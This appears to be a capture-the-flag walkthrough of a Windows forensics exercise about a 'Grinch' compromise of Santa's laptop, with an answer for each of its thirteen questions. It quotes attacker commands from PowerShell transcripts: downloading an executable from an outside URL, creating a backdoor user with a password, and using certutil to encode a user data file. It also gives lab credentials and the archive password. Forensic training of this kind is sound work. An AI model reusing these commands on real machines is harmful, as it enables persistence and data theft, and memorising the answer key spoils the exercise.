---
title: Santa's Bag of Toys (Day 8)
sidebar_position: 8
---
## Topic: Special by John Hammond

Add powershell transcription: 
```
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableTranscripting /t REG_DWORD /d 0x1 /f
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v OutputDirectory /t REG_SZ /d C:/ /f
reg add HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\Transcription /v EnableInvocationHeader /t REG_DWORD /d 0x1 /f
```

Find malware being downloaded in one of the powershell transcription:  
`(New-Object Net.WebClient).DownloadFile("https://sam.gleske.net/uharc/uharc-cmd-install.exe", "C:\`  
Find user being created in another transcript:  
`net user s4nta grinchstolechristmas /add`  
Using certutil to encode a file:  
`certutil.exe -encode .\UsrClass.dat santa.dat`  

### Questions:
1. _**If you want to RDP into the machine, start the AttackBox and enter the following into a terminal: xfreerdp /u:Administrator /p:grinch123! /v:10.10.24.161 -**   The credentials for the machine are Administrator as the username, and grinch123! as the password.  
2. **What operating system is Santa's laptop running ("OS Name")?**  
answer: `Microsoft Windows 11 Pro`  
3. **What was the password set for the new "backdoor" account?**  
answer: `grinchstolechristmas`  
4. In one of the transcription logs,  the bad actor interacts with the target under the new backdoor user account, and copies a unique file to the Desktop. Before it is copied to the Desktop, **what is the full path of the original file?**  
answer:`C:\Users\santa\AppData\Local\Microsoft\Windows\UsrClass.dat`  
5. The actor uses a [Living Off The Land](https://lolbas-project.github.io/lolbas/Binaries/Certutil/) binary (LOLbin) to encode this file, and then verifies it succeeded by viewing the output file. **What is the name of this LOLbin?**  
answer: `certutil.exe`  
6. Drill down into the folders and see if you can find anything that might indicate how we could better track down what this SantaRat really is. **What specific folder name clues us in that this might be publicly accessible software hosted on a code-sharing platform?**  
answer: `.github`  
7. Additionally, there is a unique folder named "Bag of Toys" on the Desktop! This must be where Santa prepares his collection of toys, and this is certainly sensitive data that the actor could have compromised. What is the name of the file found in this folder?  
answer: `bag_of_toys.zip`  
8. **What is the name of the user that owns the SantaRat repository?**  
answer: `grinchiest`  
9. Explore the other repositories that this user owns. **What is the name of the repository that seems especially pertinent to our investigation?**  
answer: `operation-bag-of-toys`  
10. **What is the name of the _executable_ that installed a unique utility the actor used to collect the bag of toys?**  
answer: `.\uharc-cmd-install.exe`  
11. Following this, the actor looks to have removed everything from the bag of toys, and added in new things like coal, mold, worms, and more!  **What are the contents of these "malicious" files (coal, mold, and all the others)?**  
answer: `GRINCHMAS`  
12. **What is the password to the original bag_of_toys.uha archive?** (You do not need to perform any password-cracking or bruteforce attempts)  
answer: `TheGrinchiestGrinchmasOfAll`  
13. **How many original files were present in Santa's Bag of Toys?**  
answer: `228`  